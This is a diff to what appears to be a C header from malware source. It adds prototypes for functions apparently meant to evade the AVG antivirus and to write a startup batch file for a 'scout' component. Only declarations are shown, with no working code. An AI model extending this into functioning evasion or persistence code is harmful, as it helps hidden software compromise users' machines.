@@ -30,5 +30,7 @@ PWCHAR GetStartupScoutName();
 PWCHAR GetMySelfName();
 PWCHAR GetTemp();
 
+VOID AvgInvisibility();
+VOID CreateFileAppenderBatch(__in PWCHAR lpGarbageFile, __in PWCHAR lpScoutStartupPath, __out PWCHAR *pBatchOutName);
 
 #endif
